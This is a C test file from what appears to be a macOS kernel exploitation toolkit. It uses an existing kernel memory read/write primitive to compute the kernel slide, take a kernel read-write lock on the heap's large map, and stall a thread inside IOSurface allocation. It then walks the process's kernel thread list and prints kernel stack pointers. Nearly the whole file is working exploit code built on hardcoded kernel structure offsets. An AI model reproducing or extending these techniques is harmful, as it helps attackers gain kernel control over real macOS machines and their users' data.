//
//  test_lck_rw.c
//  test
//
//  Created by admin on 1/11/22.
//

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include <dispatch/dispatch.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/slider/kernel.h>
#include <xe/xnu/proc.h>
#include <xe/xnu/thread.h>
#include <xe/util/lck_rw.h>
#include <xe/util/dispatch.h>
#include <xe/util/ptrauth.h>
#include <xe/util/assert.h>

#include "test_lck_rw.h"
#include "macos_params.h"


IOSurfaceRef iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void iosurface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "xe_key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
}


void test_lck_rw(void) {
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    printf("proc: %p\n", (void*)proc);

    uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
    uintptr_t lck_rw = kh_large_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
    printf("[INFO] locking %p\n", (void*)lck_rw);
    
    printf("[INFO] lock start\n");
    xe_util_lck_rw_t util_lock = xe_util_lck_rw_lock_exclusive(lck_rw);
    printf("[INFO] lock done\n");

    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
    dispatch_semaphore_t sem_create_start = dispatch_semaphore_create(0);
    
    dispatch_async(xe_dispatch_queue(), ^() {
        *waiting_thread = xe_xnu_thread_current_thread();
        dispatch_semaphore_signal(sem_create_start);
        
        IOSurfaceRef surface = iosurface_create();
        size_t array_len = (16384 * 3) / 8;
        printf("[INFO] begin set value\n");
        iosurface_add_values(surface, 0, array_len);
        printf("[INFO] done set value\n");
    });

    dispatch_semaphore_wait(sem_create_start, DISPATCH_TIME_FOREVER);
    printf("waiting thread: %p\n", (void*)*waiting_thread);
    
    int error = xe_util_lck_rw_wait_for_contention(util_lock, *waiting_thread, 4000, NULL);
    if (error) {
        printf("lck_rw_wait failed, err: %d\n", error);
    }
    
    printf("pid: %d\n", xe_kmem_read_uint32(proc, TYPE_PROC_MEM_P_PID_OFFSET));
    
    uintptr_t task = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_TASK_OFFSET));
    printf("num_threads: %d\n", xe_kmem_read_uint32(task, TYPE_TASK_MEM_THREAD_COUNT_OFFSET));
    
    uintptr_t cursor = xe_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
    while (cursor != 0 && cursor != task + TYPE_TASK_MEM_THREADS_OFFSET) {
        uintptr_t kernel_stack = xe_kmem_read_uint64(cursor, TYPE_THREAD_MEM_KERNEL_STACK_OFFSET);
        uintptr_t kstackptr = xe_kmem_read_uint64(cursor, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
        int state = xe_kmem_read_int32(cursor, TYPE_THREAD_MEM_STATE_OFFSET);

        printf("thread: %p\t kernel stack: %p\t kstackptr: %p\t state: %d\n", (void*)cursor, (void*)kernel_stack, (void*)kstackptr, state);
        cursor = xe_kmem_read_uint64(cursor, TYPE_THREAD_MEM_TASK_THREADS_OFFSET);
    }


    printf("[INFO] release start\n");
    xe_util_lck_rw_lock_done(&util_lock);
    printf("[INFO] release done\n");
}
